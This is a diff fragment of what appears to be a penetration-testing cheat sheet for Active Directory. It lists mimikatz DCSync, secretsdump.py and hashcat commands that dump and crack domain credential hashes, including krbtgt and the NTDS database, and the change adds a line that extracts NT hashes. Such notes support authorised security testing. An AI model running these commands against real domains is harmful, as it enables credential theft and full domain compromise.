@@ -225,13 +225,13 @@ mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
 mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
 
 # Hashcat
+cut -d ":" -f 4 hashes.txt > nt_hashes.txt
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 
 # DCSync
 secretsdump.py -just-dc-user krbtgt company.local/admin@DC-IP
 python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
-
 
 
 # Credential Hunting 
